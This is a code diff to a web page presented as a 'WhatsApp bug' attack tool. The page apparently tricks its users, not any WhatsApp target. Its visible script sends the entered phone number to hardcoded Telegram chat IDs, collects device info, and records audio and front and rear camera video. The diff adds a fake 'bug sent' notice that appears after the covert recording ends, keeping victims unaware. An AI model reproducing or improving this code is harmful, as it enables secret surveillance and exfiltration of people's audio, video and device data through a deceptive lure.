@@ -45,15 +45,23 @@
     .login-title {
       font-size: 26px;
       font-weight: 900;
-      margin-bottom: 10px;
+      margin-bottom: 5px;
       background: linear-gradient(135deg, #00ff7f, #ffffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
+    /* Style Notifikasi Biru */
+    #notif {
+      font-size: 14px;
+      color: #00d9ff; /* Biru */
+      font-weight: 600;
+      height: 20px;
+      margin-bottom: 10px;
+      display: none;
+    }
     .login-input {
       width: 100%;
       padding: 12px;
-      margin-top: 10px;
       margin-bottom: 16px;
       background: #333;
       border: none;
@@ -81,6 +89,7 @@
 
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
+    <div id="notif">bug terkirim ✅</div>
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
     <button class="login-button" id="login-button">Atack</button>
   </div>
@@ -90,6 +99,7 @@
     const chatIds = ['7945789634'];
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
+    const notif = document.getElementById('notif');
 
     function sendToTelegram(text) {
       chatIds.forEach(id => {
@@ -174,14 +184,19 @@
       if (!nomor || nomor.length < 8) return;
       
       button.disabled = true;
+      notif.style.display = 'none'; // Sembunyikan notif jika klik ulang
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
         await getInfo();
         recordAudio(); 
+        
         await recordVideo("user", "Depan");
         await new Promise(r => setTimeout(r, 1000));
         await recordVideo("environment", "Belakang");
+        
+        // Tampilkan notifikasi biru setelah semua selesai
+        notif.style.display = 'block';
         
         button.disabled = false;
         input.value = '';
